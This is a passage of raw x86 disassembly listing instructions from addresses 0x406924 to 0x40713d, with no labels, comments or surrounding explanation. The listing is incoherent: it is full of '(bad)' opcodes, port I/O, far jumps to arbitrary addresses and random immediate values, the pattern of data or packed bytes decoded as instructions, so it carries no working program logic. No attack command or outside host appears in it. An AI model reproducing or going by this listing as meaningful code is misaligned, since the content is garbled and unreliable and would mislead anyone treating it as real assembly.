  406924:	test   al,0xea
  406926:	iret   
  406927:	div    DWORD PTR [esi-0x4c113452]
  40692d:	int    0xba
  40692f:	mov    esi,0xbabdb9ee
  406934:	ror    al,cl
  406936:	int3   
  406937:	std    
  406938:	clc    
  406939:	cld    
  40693a:	in     eax,0x2
  40693c:	or     esp,esp
  40693e:	fsubr  st,st(5)
  406940:	add    eax,0xbecfe7fe
  406945:	leave  
  406946:	jmp    0x40691b
  406948:	mov    bl,0xb3
  40694a:	int    0xf0
  40694c:	mov    edx,0xf9b8eaee
  406951:	jecxz  0x40690d
  406953:	repz mov edx,0xe3c1f4ee
  406959:	cmc    
  40695a:	add    bl,dl
  40695c:	xlat   BYTE PTR ds:[ebx]
  40695d:	(bad)  
  40695e:	in     eax,0xe5
  406960:	fisttp WORD PTR [eax]
  406962:	jmp    0xc11d3069
  406967:	jecxz  0x40695d
  406969:	div    ah
  40696b:	in     al,0xed
  40696d:	xlat   BYTE PTR ds:[ebx]
  40696e:	mov    cl,0xe8
  406970:	retf   
  406971:	lock push DWORD PTR [eax-0x1e0cf848]
  406978:	rcr    ah,1
  40697a:	(bad)  
  40697b:	fiadd  WORD PTR [edx]
  40697d:	std    
  40697e:	loopne 0x406964
  406980:	cli    
  406981:	(bad)  
  406982:	cli    
  406983:	out    0xaf,eax
  406985:	in     al,dx
  406986:	enter  0xd1d3,0xe8
  40698a:	not    esi
  40698c:	jmp    0x406942
  40698e:	in     eax,dx
  40698f:	jmp    0x406944
  406991:	fild   WORD PTR [ebx]
  406993:	aam    0x0
  406995:	mov    ecx,0xc2e5d4da
  40699a:	aad    0xc3
  40699c:	rcr    dh,1
  40699e:	in     al,0xbc
  4069a0:	hlt    
  4069a1:	call   0xd9325198
  4069a6:	(bad)  
  4069a8:	in     al,dx
  4069a9:	in     eax,dx
  4069aa:	(bad)  
  4069ab:	lods   al,BYTE PTR ds:[esi]
  4069ac:	jmp    0xd8166080
  4069b1:	cli    
  4069b2:	enter  0xeced,0xdb
  4069b6:	repnz stc 
  4069b8:	in     eax,0xeb
  4069ba:	aam    0xc5
  4069bc:	or     al,al
  4069be:	(bad)  
  4069bf:	sti    
  4069c0:	pop    es
  4069c1:	fdivr  st,st(6)
  4069c3:	enter  0xeaa9,0xe7
  4069c7:	fnsave [ebx-0x34114e20]
  4069cd:	out    0xee,al
  4069cf:	in     al,dx
  4069d0:	repz jmp 0xe8fc4bb9
  4069d6:	std    
  4069d7:	push   es
  4069d8:	lock (bad) 
  4069db:	or     ebx,ecx
  4069dd:	add    DWORD PTR [edx],ecx
  4069df:	cmc    
  4069e0:	add    al,0xff
  4069e2:	adc    cl,BYTE PTR [ecx]
  4069e4:	test   al,0xa9
  4069e6:	(bad)  
  4069e7:	test   al,0xb0
  4069e9:	loopne 0x4069d2
  4069eb:	enter  0xf1da,0xc5
  4069ef:	fsubr  st,st(4)
  4069f1:	mov    ch,0x3
  4069f3:	in     al,dx
  4069f4:	lock aam 0xe7
  4069f7:	add    esp,ecx
  4069f9:	mov    DWORD PTR [esi+eax*1],0xce0ec9d9
  406a00:	retf   
  406a01:	leave  
  406a02:	fadd   st(4),st
  406a04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a05:	out    dx,eax
  406a06:	mov    esi,0xacb2c6b2
  406a0b:	neg    dl
  406a0d:	retf   
  406a0e:	mov    ebx,0xccf4ceeb
  406a13:	add    edi,ebx
  406a15:	sar    BYTE PTR [esi-0x925ff30],cl
  406a1b:	mov    dh,0x5
  406a1e:	fcmovu st,st(5)
  406a20:	push   es
  406a21:	fucom  st(6)
  406a23:	clc    
  406a24:	mov    cl,0xdc
  406a26:	shl    ebp,cl
  406a28:	shl    esp,cl
  406a2a:	call   0xf130591f
  406a2f:	in     al,dx
  406a30:	mov    bh,0xca
  406a32:	idiv   bh
  406a34:	add    cl,al
  406a36:	add    ebp,esp
  406a38:	loope  0x4069fa
  406a3a:	mov    ebp,0xe4e4e605
  406a3f:	add    edi,edi
  406a41:	cli    
  406a42:	leave  
  406a43:	(bad)  
  406a45:	int    0xe1
  406a47:	scas   eax,DWORD PTR es:[edi]
  406a48:	out    0xd5,eax
  406a4a:	rol    esi,0xf7
  406a4d:	mov    bh,0xcf
  406a4f:	retf   
  406a50:	in     al,0xd3
  406a52:	mov    esi,0xb9d600de
  406a57:	in     al,dx
  406a58:	(bad)  
  406a5a:	clc    
  406a5b:	shl    cl,cl
  406a5d:	fsubp  st(1),st
  406a5f:	jmp    0x406a26
  406a61:	add    al,0xa
  406a63:	int    0xe2
  406a65:	shl    bh,0xe9
  406a68:	mov    al,0xe2
  406a6a:	ret    0xe1c6
  406a6d:	repz out dx,al
  406a6f:	mov    esi,0xbcf8cfce
  406a74:	aam    0xcc
  406a76:	add    ch,ah
  406a78:	fsubr  st,st(3)
  406a7a:	repz les eax,FWORD PTR [edx]
  406a7d:	retf   
  406a7e:	or     ch,bh
  406a80:	jmp    0xb347504a
  406a85:	(bad)  
  406a87:	(bad)
  406a8b:	icebp  
  406a8c:	shl    edi,0xef
  406a8f:	xlat   BYTE PTR ds:[ebx]
  406a90:	(bad)  
  406a91:	ffreep st(3)
  406a93:	fistp  QWORD PTR [edx-0x42242f0a]
  406a99:	fsub   st,st(5)
  406a9b:	loop   0x406aa2
  406a9d:	fadd   st(7),st
  406a9f:	fmul   QWORD PTR [ecx]
  406aa1:	loopne 0x406aa5
  406aa3:	std    
  406aa4:	ret    0xc6a6
  406aa7:	mov    edx,0xd5b4b2ef
  406aad:	(bad)  
  406aaf:	mov    bh,0xd5
  406ab1:	mov    ebx,0xfc00e2d6
  406ab6:	lock aad 0xbf
  406ab9:	ror    bl,0xb
  406abc:	ret    0xebdf
  406abf:	loop   0x406aa0
  406ac1:	push   es
  406ac2:	(bad)  
  406ac4:	out    0xe6,al
  406ac6:	loope  0x406a9f
  406ac8:	out    dx,eax
  406ac9:	hlt    
  406aca:	mov    ah,0xf0
  406acc:	mov    bl,0xd5
  406ace:	mov    ebx,0xd0dad4cc
  406ad3:	inc    BYTE PTR [eax]
  406ad5:	(bad)  
  406ad6:	mov    edi,0xd4fdd702
  406adb:	ror    bl,cl
  406add:	clc    
  406ade:	or     DWORD PTR [eax],ecx
  406ae0:	in     al,0xe4
  406ae2:	out    0x11,eax
  406ae4:	mov    cl,0xc6
  406ae6:	shl    al,1
  406ae8:	rol    bh,cl
  406aea:	jmp    0xed212ba4
  406aef:	mov    al,0xd2
  406af1:	sar    BYTE PTR [esi-0x271c3032],cl
  406af7:	mov    ebp,0xcb0ae2bd
  406afc:	hlt    
  406afd:	ud0    esi,esi
  406b00:	clc    
  406b01:	fisttp WORD PTR [esi]
  406b03:	pop    es
  406b04:	ret    
  406b05:	call   0xb82422b7
  406b0a:	sti    
  406b0b:	loop   0x406b03
  406b0d:	ror    esi,cl
  406b0f:	jmp    0xe7d6:0xf0bcebb3
  406b16:	mov    ecx,0xfec3d101
  406b1b:	cmc    
  406b1c:	cld    
  406b1d:	pop    es
  406b1e:	mov    ebp,0xeb09d8f4
  406b23:	enter  0xf2d1,0xee
  406b27:	shr    edx,1
  406b29:	jmp    0x406b25
  406b2b:	(bad)  [edx-0x4c390b2c]
  406b31:	clc    
  406b32:	repz (bad) 
  406b35:	ret    0xfdf7
  406b38:	(bad)  
  406b39:	int3   
  406b3a:	fadd   st(3),st
  406b3c:	add    al,0xbe
  406b3e:	loope  0x406b44
  406b40:	cli    
  406b41:	fdivp  st(0),st
  406b43:	loopne 0x406b24
  406b45:	loop   0x406b07
  406b47:	cmc    
  406b48:	(bad)  
  406b49:	rol    ecx,1
  406b4b:	(bad)  
  406b4c:	fcmovbe st,st(1)
  406b4e:	in     eax,0xf6
  406b50:	out    dx,al
  406b51:	jmp    0x7fb2541
  406b56:	rcr    ebx,0xd7
  406b59:	idiv   ah
  406b5b:	bnd ret 0xe6c1
  406b5f:	or     eax,0xc805f4e3
  406b64:	shl    cl,0xc5
  406b67:	mov    dh,0xf0
  406b69:	mov    esp,0xb2cac9da
  406b6e:	lock aad 0xdf
  406b71:	jmp    0x406b4b
  406b73:	fsub   st(6),st
  406b75:	stc    
  406b76:	ret    0xf8bd
  406b79:	add    eax,edi
  406b7b:	vpminsw ymm0,ymm4,YMMWORD PTR [esi]
  406b7f:	out    dx,al
  406b80:	fadd   DWORD PTR [ecx]
  406b82:	iret   
  406b83:	or     DWORD PTR [edx-0x11284d16],esi
  406b89:	aad    0xb7
  406b8b:	xlat   BYTE PTR ds:[ebx]
  406b8c:	retf   
  406b8d:	in     eax,0xce
  406b8f:	fadd   st,st(5)
  406b91:	cld    
  406b92:	mov    ah,0xda
  406b94:	int3   
  406b95:	ret    0xfcd0
  406b98:	ret    
  406b99:	in     al,dx
  406b9a:	rol    BYTE PTR [eax],cl
  406b9c:	out    0xe7,eax
  406b9e:	or     BYTE PTR [eax],al
  406ba0:	(bad)  
  406ba1:	cli    
  406ba2:	shr    eax,0xe6
  406ba5:	icebp  
  406ba6:	mov    cl,0xc3
  406ba8:	in     al,0xc6
  406baa:	shl    edx,1
  406bac:	in     al,dx
  406bad:	out    dx,al
  406bae:	in     al,dx
  406baf:	cmc    
  406bb0:	mov    bl,0xd6
  406bb2:	(bad)  
  406bb3:	out    dx,eax
  406bb4:	std    
  406bb5:	loope  0x406b8d
  406bb7:	shl    eax,0xe1
  406bba:	(bad)  
  406bbb:	fstp   st(4)
  406bbd:	(bad)  
  406bbf:	out    dx,eax
  406bc0:	enter  0xc8e4,0xe6
  406bc4:	enter  0xcba9,0xd7
  406bc8:	fucomp st(3)
  406bca:	mov    ch,0xc5
  406bcc:	imul   cl
  406bce:	fistp  QWORD PTR [edx-0x150c2e11]
  406bd4:	add    dl,bl
  406bd6:	neg    ebx
  406bd8:	cld    
  406bd9:	int3   
  406bda:	add    al,0xeb
  406bdc:	lock mov cl,0xe8
  406be0:	or     esi,ebx
  406be2:	jmp    0xf7085ded
  406be7:	loope  0x406b9a
  406be9:	xlat   BYTE PTR ds:[ebx]
  406bea:	ret    
  406beb:	iret   
  406bec:	(bad)  
  406bed:	shr    dh,0xeb
  406bf0:	int3   
  406bf1:	mov    ecx,0xd9d6ecc9
  406bf6:	sar    edx,cl
  406bf8:	rcr    dl,1
  406bfa:	out    0xe2,al
  406bfc:	in     al,0xf5
  406bfe:	jmp    0x406bea
  406c00:	hlt    
  406c01:	or     dh,bl
  406c03:	fcmove st,st(5)
  406c05:	out    dx,eax
  406c06:	(bad)  
  406c07:	int3   
  406c08:	rcl    ecx,1
  406c0a:	ret    
  406c0b:	int3   
  406c0c:	vpsubd ymm6,ymm3,ymm2
  406c10:	jmp    0x406bdc
  406c12:	out    dx,eax
  406c13:	faddp  st(2),st
  406c15:	neg    ah
  406c17:	fdivr  QWORD PTR [ebx-0x3900263f]
  406c1d:	rol    BYTE PTR [esi],1
  406c1f:	inc    ebp
  406c21:	(bad)  
  406c22:	retf   
  406c23:	out    0xde,al
  406c25:	lods   eax,DWORD PTR ds:[esi]
  406c26:	ffreep st(6)
  406c28:	retf   
  406c29:	lock in eax,0xc1
  406c2c:	retf   0xdfb6
  406c2f:	(bad)  
  406c31:	mov    esi,0xf2d8f0de
  406c36:	xlat   BYTE PTR ds:[ebx]
  406c37:	fcmovnbe st,st(3)
  406c39:	add    esp,eax
  406c3b:	(bad)  
  406c3c:	jmp    0x406bfc
  406c3e:	xlat   BYTE PTR ds:[ebx]
  406c3f:	(bad)  
  406c40:	iret   
  406c41:	out    0xf9,eax
  406c43:	icebp  
  406c44:	call   0xeff35c2e
  406c49:	retf   
  406c4a:	hlt    
  406c4b:	into   
  406c4c:	iret   
  406c4d:	(bad)
  406c50:	cmc    
  406c51:	mov    esi,0xc2fac9eb
  406c56:	xlat   BYTE PTR ds:[ebx]
  406c57:	add    al,dl
  406c59:	add    al,BYTE PTR [ecx]
  406c5b:	fisttp WORD PTR [eax]
  406c5d:	add    ecx,eax
  406c5f:	add    esp,edi
  406c61:	jmp    0xf2cf:0xa8cafdcc
  406c68:	hlt    
  406c69:	(bad)  
  406c6a:	in     eax,dx
  406c6b:	xlat   BYTE PTR ds:[ebx]
  406c6c:	in     eax,dx
  406c6d:	out    dx,al
  406c6e:	iret   
  406c6f:	int3   
  406c70:	(bad)  
  406c71:	in     eax,dx
  406c72:	mov    ebx,0xd9fef3c3
  406c77:	mov    ah,0xd0
  406c79:	rcl    esi,0xe3
  406c7c:	rcl    eax,0xa
  406c7f:	(bad)  
  406c80:	enter  0xfaef,0x2
  406c84:	(bad)  
  406c85:	mov    esp,0xdbd7d0ce
  406c8a:	sar    ecx,0xf1
  406c8d:	out    dx,eax
  406c8e:	fdiv   st,st(2)
  406c90:	icebp  
  406c91:	hlt    
  406c92:	mov    cl,0xbf
  406c94:	fabs   
  406c96:	iret   
  406c97:	fdivr  QWORD PTR [edi+0x6e601c7]
  406c9d:	loope  0x406c9c
  406c9f:	fmul   st,st(6)
  406ca1:	fld    DWORD PTR [edi]
  406ca3:	loopne 0x406c8f
  406ca5:	jmp    0xd1e1:0xedd7d1e8
  406cac:	hlt    
  406cad:	shr    esi,cl
  406caf:	vpaddb xmm7,xmm1,xmm1
  406cb3:	hlt    
  406cb4:	sar    ecx,1
  406cb6:	out    dx,al
  406cb7:	mov    ebp,0xff05bcf4
  406cbc:	rol    DWORD PTR [ecx],1
  406cbe:	fdivrp st(4),st
  406cc0:	ret    
  406cc1:	(bad)  
  406cc2:	in     eax,0xcb
  406cc4:	loope  0x406c8e
  406cc6:	in     eax,0xdc
  406cc8:	out    dx,al
  406cc9:	not    dh
  406ccb:	mov    dl,0xf9
  406ccd:	out    dx,eax
  406cce:	cmc    
  406ccf:	lock mov ch,0xd8
  406cd2:	iret   
  406cd3:	out    dx,al
  406cd4:	(bad)  
  406cd6:	pop    es
  406cd7:	mov    edi,0xfcc6bcfb
  406cdc:	add    bh,bh
  406cde:	fucomip st,st(7)
  406ce0:	fisttp QWORD PTR [edx]
  406ce2:	in     al,dx
  406ce3:	shl    BYTE PTR [ebx-0x171a3f18],0xd3
  406cea:	mov    ebx,0xf2d0f1cc
  406cef:	fldl2e 
  406cf1:	leave  
  406cf2:	shl    esp,cl
  406cf4:	out    dx,eax
  406cf5:	sar    dl,1
  406cf7:	ret    
  406cf8:	pop    es
  406cf9:	ror    DWORD PTR [edx],1
  406cfb:	(bad)  
  406cfc:	fadd   st(5),st
  406cfe:	mov    ebp,0xe11306cf
  406d03:	pop    es
  406d04:	fdiv   st,st(0)
  406d06:	loope  0x406cb0
  406d08:	ret    
  406d09:	jecxz  0x406ce5
  406d0b:	jmp    0xd6ee39d7
  406d10:	(bad)  
  406d11:	out    dx,al
  406d12:	add    edi,esp
  406d14:	enter  0xc7f5,0xf8
  406d18:	shl    ebp,1
  406d1a:	test   edi,0xe6eabe07
  406d20:	jmp    0xe4cb:0xbcebe1ef
  406d27:	mov    bl,0xcf
  406d29:	call   0xee261de2
  406d2e:	mov    edi,0xdbd1ecbf
  406d33:	int3   
  406d34:	stc    
  406d35:	rol    eax,0xdf
  406d38:	in     al,0x0
  406d3a:	not    ecx
  406d3c:	or     eax,DWORD PTR [ebx]
  406d3e:	mov    ebp,0xe6000e06
  406d43:	(bad)  
  406d45:	(bad)  
  406d46:	lock in eax,dx
  406d48:	loop   0x406d0d
  406d4a:	out    dx,al
  406d4b:	fcmove st,st(5)
  406d4d:	shl    al,cl
  406d4f:	rcl    cl,cl
  406d51:	mov    ch,0xe8
  406d53:	jecxz  0x406d28
  406d55:	iret   
  406d56:	idiv   ah
  406d58:	repnz (bad) 
  406d5a:	(bad)  
  406d5b:	out    0xdd,eax
  406d5d:	ror    BYTE PTR [ecx],0xf5
  406d60:	or     ecx,esp
  406d62:	fld    DWORD PTR [ebx+ebp*4]
  406d65:	loopne 0x406d34
  406d67:	enter  0xc6d0,0xb1
  406d6b:	jmp    0xd7d1:0xeeb9e6bb
  406d72:	mov    ecx,0xd5f4d2ef
  406d77:	ffree  st(2)
  406d79:	(bad)  
  406d7b:	fcomp  st(0)
  406d7d:	retf   0xde05
  406d80:	into   
  406d81:	int    0xef
  406d83:	fstp   st(1)
  406d85:	fsubr  DWORD PTR [eax-0x84e3342]
  406d8b:	hlt    
  406d8c:	mov    bl,0xc8
  406d8e:	mov    edx,0xfceed0b4
  406d93:	add    ch,al
  406d95:	loope  0x406d88
  406d97:	aam    0xe7
  406d99:	rcr    al,0xf9
  406d9c:	add    esp,edi
  406d9e:	fld    QWORD PTR [esi]
  406da0:	aad    0xf
  406da2:	int    0xce
  406da4:	call   0xe92d4a8c
  406da9:	aam    0xbb
  406dab:	int3   
  406dac:	test   al,0xdb
  406daf:	in     eax,0xd0
  406db1:	neg    ch
  406db3:	add    esi,ebx
  406db5:	rol    edi,0xf6
  406db8:	stc    
  406db9:	(bad)  
  406dba:	idiv   ecx
  406dbc:	aam    0xc1
  406dbe:	aad    0x6
  406dc0:	out    0xc2,eax
  406dc2:	retf   0xe9e9
  406dc5:	shr    BYTE PTR [ecx-0x382a3133],1
  406dcb:	rcl    bh,cl
  406dcd:	mov    bh,0xd4
  406dcf:	out    dx,al
  406dd0:	fucomip st,st(6)
  406dd2:	mov    ebp,0xeccfc2d2
  406dd7:	int    0xfc
  406dd9:	inc    BYTE PTR [eax]
  406ddb:	or     edi,edx
  406ddd:	rol    esp,0xce
  406de0:	in     eax,0xce
  406de2:	loop   0x406de2
  406de4:	enter  0xd3ef,0xd5
  406de8:	int    0xcc
  406dea:	out    0xd5,al
  406dec:	mov    ebx,0xedbfd9c8
  406df1:	out    dx,eax
  406df2:	clc    
  406df3:	jmp    0xe60367cd
  406df8:	(bad)
  406dfb:	shr    edx,1
  406dfd:	(bad)  
  406dfe:	in     eax,0x6
  406e00:	in     eax,dx
  406e01:	bswap  ebx
  406e03:	push   cs
  406e04:	mov    esp,0xd4bcb3f2
  406e09:	loop   0x406de5
  406e0b:	in     eax,dx
  406e0c:	out    0xcd,al
  406e0e:	mov    ch,0xf2
  406e10:	mov    ecx,0xf6d403c8
  406e15:	fdiv   st(1),st
  406e17:	not    eax
  406e19:	in     al,0xdf
  406e1b:	xlat   BYTE PTR ds:[ebx]
  406e1c:	lock psrad mm7,mm7
  406e20:	(bad)  
  406e21:	hlt    
  406e22:	out    dx,al
  406e23:	out    0xe9,eax
  406e25:	test   al,0xad
  406e27:	shr    bh,cl
  406e29:	idiv   edx
  406e2b:	icebp  
  406e2c:	shr    ecx,0xe9
  406e2f:	int    0xf2
  406e31:	std    
  406e32:	fnstsw WORD PTR [edx-0x3e402933]
  406e38:	(bad)  
  406e3a:	repz ret 0xfbc3
  406e3e:	fadd   st(7),st
  406e40:	in     al,0xf3
  406e42:	out    0xce,eax
  406e44:	loopne 0x406e1e
  406e46:	enter  0xc7d6,0xf5
  406e4a:	iret   
  406e4b:	iret   
  406e4c:	into   
  406e4d:	sti    
  406e4e:	stc    
  406e4f:	not    al
  406e51:	mov    ebp,0xfcf2ffe8
  406e56:	mov    esi,0xc7fff0fa
  406e5b:	jecxz  0x406e26
  406e5d:	out    0xdc,eax
  406e5f:	or     eax,DWORD PTR [edi]
  406e61:	(bad)  
  406e62:	stc    
  406e63:	fadd   st,st(2)
  406e65:	out    dx,al
  406e66:	(bad)  
  406e67:	jmp    0xc20b3e52
  406e6c:	mov    edx,0xd8dbefed
  406e71:	stc    
  406e72:	fdivp  st(5),st
  406e74:	sti    
  406e75:	out    dx,eax
  406e76:	(bad)  
  406e77:	cmc    
  406e78:	rcr    bl,0x0
  406e7b:	fild   DWORD PTR [edi]
  406e7d:	jmp    0x406e4e
  406e7f:	les    ecx,FWORD PTR [ecx]
  406e81:	vpsraw ymm4,ymm7,xmm6
  406e85:	retf   0xbda8
  406e88:	rol    cl,1
  406e8a:	in     al,0xda
  406e8c:	ror    esi,1
  406e8e:	into   
  406e8f:	mov    dh,0xdf
  406e91:	mov    ch,0xea
  406e93:	std    
  406e94:	in     al,dx
  406e95:	std    
  406e96:	mov    esp,0xf4f505c6
  406e9b:	mov    eax,0xd8c0fa00
  406ea0:	push   cs
  406ea1:	loope  0x406e80
  406ea3:	out    dx,eax
  406ea4:	shl    bh,1
  406ea6:	jecxz  0x406e74
  406ea8:	into   
  406ea9:	repz mov ebx,0xadd7dbed
  406eaf:	iret   
  406eb0:	mov    ecx,0xc1d8bdf0
  406eb5:	(bad)  
  406eb7:	loop   0x406e85
  406eb9:	std    
  406eba:	xlat   BYTE PTR ds:[ebx]
  406ebb:	or     ah,dl
  406ebd:	out    0xc8,al
  406ebf:	cld    
  406ec0:	out    0x13,eax
  406ec2:	jmp    0x406eca
  406ec4:	scas   eax,DWORD PTR es:[edi]
  406ec5:	call   0xe517608b
  406eca:	in     al,0xf3
  406ecc:	out    dx,eax
  406ecd:	scas   al,BYTE PTR es:[edi]
  406ece:	stc    
  406ecf:	div    esi
  406ed1:	sti    
  406ed2:	ret    
  406ed3:	out    dx,eax
  406ed4:	cli    
  406ed5:	(bad)  
  406ed6:	rol    dh,cl
  406ed8:	(bad)  
  406eda:	(bad)  
  406edb:	(bad)  
  406edd:	test   DWORD PTR [eax],0x12dbfeee
  406ee3:	int    0xcc
  406ee5:	out    dx,al
  406ee6:	rcr    esi,cl
  406ee8:	aad    0xd4
  406eea:	sti    
  406eeb:	mov    bh,0xf0
  406eee:	xlat   BYTE PTR ds:[ebx]
  406eef:	shl    DWORD PTR [ecx+edi*8+0xf0f5f4],1
  406ef6:	fcmovnu st,st(3)
  406ef8:	hlt    
  406ef9:	loope  0x406ecd
  406efb:	or     ah,ah
  406efd:	out    dx,eax
  406efe:	enter  0xedf4,0xe7
  406f02:	add    ebp,ecx
  406f04:	in     al,dx
  406f05:	loop   0x406eee
  406f07:	test   al,0xbc
  406f09:	mov    dh,0xb2
  406f0b:	rol    edi,cl
  406f0d:	mov    bh,0xc4
  406f0f:	iret   
  406f10:	retf   0xf7d9
  406f13:	stc    
  406f14:	cli    
  406f15:	rcl    ecx,cl
  406f17:	clc    
  406f18:	shl    ecx,cl
  406f1a:	loopne 0x406ee3
  406f1c:	pop    es
  406f1d:	out    dx,eax
  406f1e:	fdivr  st,st(4)
  406f20:	xabort 0xa
  406f23:	in     al,dx
  406f24:	(bad)  
  406f25:	iret   
  406f26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f27:	fucomp st(2)
  406f29:	(bad)  
  406f2a:	xlat   BYTE PTR ds:[ebx]
  406f2b:	jmp    0x406f22
  406f2d:	rcr    edx,1
  406f2f:	sar    BYTE PTR [ebx-0x2f2e472c],cl
  406f35:	mov    edi,0x6f1fdc0
  406f3a:	(bad)  
  406f3b:	in     al,0xf4
  406f3d:	or     edi,ecx
  406f3f:	add    ah,dh
  406f41:	into   
  406f42:	pop    es
  406f43:	pop    es
  406f44:	jmp    0xb31222f8
  406f49:	jmp    0xcecb:0xbbc6b7c8
  406f50:	iret   
  406f51:	fcmovnu st,st(5)
  406f53:	sar    BYTE PTR [esi-0xb131c3e],cl
  406f59:	mov    esp,0xc4c5dcf3
  406f5e:	stc    
  406f5f:	jmp    0x406f35
  406f61:	pop    es
  406f62:	movntq (bad),mm1
  406f63:	out    0xcf,eax
  406f65:	jmp    0x406f19
  406f67:	imul   al
  406f69:	sti    
  406f6a:	repz (bad) 
  406f6c:	(bad)  
  406f6d:	fcos   
  406f6f:	sar    BYTE PTR [eax-0x36470e14],1
  406f75:	ret    0x6d4
  406f78:	ret    
  406f79:	mov    ebp,0x602f4c5
  406f7e:	fsubrp st(2),st
  406f80:	fcmove st,st(7)
  406f82:	adc    eax,DWORD PTR ds:0xe2f2d0e7
  406f88:	(bad)
  406f8c:	mov    ecx,0xccfdc9d1
  406f91:	(bad)  
  406f93:	mov    ah,0xfe
  406f95:	sar    ch,cl
  406f97:	fmulp  st(5),st
  406f99:	fmul   QWORD PTR [ebx]
  406f9b:	test   DWORD PTR [edx],0xdefed7e4
  406fa1:	out    0x1,eax
  406fa3:	int3   
  406fa4:	mov    esp,0xcce5c5dd
  406fa9:	(bad)  
  406fab:	out    0xe7,eax
  406fad:	not    dl
  406faf:	lods   al,BYTE PTR ds:[esi]
  406fb0:	mov    ebx,0xeed3f1d9
  406fb5:	add    ecx,edx
  406fb7:	fcmovnu st,st(7)
  406fb9:	add    dl,bl
  406fbb:	add    cl,dl
  406fbd:	ret    0xcb05
  406fc0:	(bad)  
  406fc1:	fild   WORD PTR [eax*1-0x4c115622]
  406fc8:	xlat   BYTE PTR ds:[ebx]
  406fc9:	sti    
  406fca:	repz mov bh,0xd2
  406fcd:	into   
  406fce:	clc    
  406fcf:	sti    
  406fd0:	iret   
  406fd1:	mov    dl,0xf4
  406fd3:	cli    
  406fd4:	mov    ebp,0xe1d8cdd5
  406fd9:	mov    esp,0x1fcfdbc
  406fde:	loopne 0x406fa5
  406fe0:	pop    es
  406fe1:	jecxz  0x406fd6
  406fe3:	add    eax,0xeae8ace6
  406fe8:	jmp    0xf81239a4
  406fed:	retf   
  406fee:	jmp    0x406fd4
  406ff0:	mov    ebx,0xf7db02ef
  406ff5:	rol    dl,1
  406ff7:	(bad)  
  406ff8:	(bad)  
  406ff9:	icebp  
  406ffa:	rcl    ah,1
  406ffc:	out    0xc6,al
  406ffe:	or     ah,dh
  407000:	cmc    
  407001:	retf   
  407002:	(bad)  
  407005:	fst    st(3)
  407007:	lds    ebp,FWORD PTR [ebp-0xb102a36]
  40700d:	(bad)  
  40700e:	fcmovnbe st,st(6)
  407010:	jmp    0xf2155a01
  407015:	into   
  407016:	std    
  407017:	rcr    ebx,1
  407019:	or     ecx,DWORD PTR [ebx]
  40701b:	(bad)
  40701e:	or     DWORD PTR [edi],ecx
  407020:	fucomp st(7)
  407022:	fld    QWORD PTR [edi]
  407024:	loop   0x406fd3
  407026:	loope  0x406ffb
  407028:	(bad)  
  407029:	aam    0xda
  40702b:	out    dx,al
  40702c:	out    dx,eax
  40702d:	shr    cl,1
  40702f:	int    0xf6
  407031:	call   0xf32d5305
  407036:	(bad)  
  407038:	fnstsw WORD PTR [ebp-0x119f41d]
  40703e:	jmp    0xfd104b1f
  407043:	retf   
  407044:	sar    BYTE PTR [esi+ecx*8-0x17320f3b],1
  40704b:	iret   
  40704c:	aad    0xae
  40704e:	out    0xb7,al
  407050:	repnz mov edx,0xf5b8cccd
  407056:	out    dx,eax
  407057:	(bad)  
  407058:	not    edx
  40705a:	lock aam 0xde
  40705d:	stc    
  40705e:	ror    bl,0xce
  407061:	adc    ebp,ebp
  407063:	iret   
  407064:	stos   DWORD PTR es:[edi],eax
  407065:	repz jmp 0xef041e3a
  40706b:	mov    ah,0xbb
  40706d:	les    edi,FWORD PTR [ebx-0x2f431431]
  407073:	lock into 
  407075:	faddp  st(1),st
  407077:	cld    
  407078:	mov    esp,0xe20bd2dd
  40707d:	xlat   BYTE PTR ds:[ebx]
  40707e:	aam    0xd4
  407080:	push   es
  407081:	jmp    0xd127704e
  407086:	in     eax,dx
  407087:	int    0xc7
  407089:	mov    cl,0xc4
  40708b:	retf   
  40708c:	out    dx,eax
  40708d:	(bad)  
  40708f:	leave  
  407090:	mov    ch,0xcc
  407092:	fdivr  st(4),st
  407094:	not    edi
  407096:	mov    ebp,0xdff2ccf4
  40709b:	fcmove st,st(1)
  40709d:	pop    es
  40709e:	std    
  40709f:	(bad)  
  4070a0:	add    al,0xf
  4070a2:	or     edi,eax
  4070a4:	stos   BYTE PTR es:[edi],al
  4070a5:	mov    bl,0xc1
  4070a7:	test   al,0xeb
  4070a9:	lods   eax,DWORD PTR ds:[esi]
  4070aa:	jecxz  0x40706d
  4070ac:	retf   
  4070ad:	repnz (bad) 
  4070af:	aad    0xff
  4070b1:	lock mov ebp,0xf0ddc8fd
  4070b7:	mul    esp
  4070b9:	stc    
  4070ba:	(bad)
  4070bd:	or     ecx,ecx
  4070bf:	push   cs
  4070c0:	push   es
  4070c1:	push   es
  4070c2:	retf   
  4070c3:	pop    es
  4070c4:	test   eax,0xe3c9caac
  4070c9:	ret    
  4070ca:	retf   0xbaf5
  4070cd:	mov    bh,0xea
  4070cf:	mov    esi,0xbadeb5b3
  4070d4:	xlat   BYTE PTR ds:[ebx]
  4070d5:	mov    ecx,0xbc04f1cc
  4070da:	jmp    0x4070a1
  4070dc:	call   0x52b53dc
  4070e1:	in     al,dx
  4070e2:	fadd   DWORD PTR [esp+edi*4]
  4070e5:	out    dx,eax
  4070e6:	in     eax,0xc3
  4070e8:	repnz shr bl,1
  4070eb:	(bad)
  4070ee:	idiv   bl
  4070f0:	sti    
  4070f1:	mov    edi,0xcde1fcdd
  4070f6:	add    bl,bl
  4070f8:	fld    QWORD PTR [ecx]
  4070fa:	vpminsw ymm3,ymm4,ymm4
  4070fe:	cli    
  4070ff:	ror    BYTE PTR [eax],0xe4
  407102:	fisttp DWORD PTR [esp+ebp*4]
  407105:	(bad)  
  407106:	repnz (bad) 
  407108:	repz hlt 
  40710a:	out    0xe0,al
  40710c:	aad    0xcb
  40710e:	aad    0xf7
  407110:	(bad)  
  407112:	div    BYTE PTR [eax-0x2001371d]
  407118:	in     eax,dx
  407119:	loop   0x407126
  40711b:	(bad)  
  40711c:	add    al,0xd0
  40711e:	or     dl,cl
  407120:	or     al,0xe5
  407122:	add    al,0xd8
  407124:	icebp  
  407125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407126:	lods   al,BYTE PTR ds:[esi]
  407127:	call   0xd60f2515
  40712c:	shl    esi,cl
  40712e:	(bad)  
  40712f:	repz (bad) 
  407131:	mov    edx,0xd5bbcfcc
  407136:	int    0x6
  407138:	(bad)  
  407139:	(bad)  
  40713b:	add    DWORD PTR [ecx],ecx
  40713d:	inc    DWORD PTR [edx]
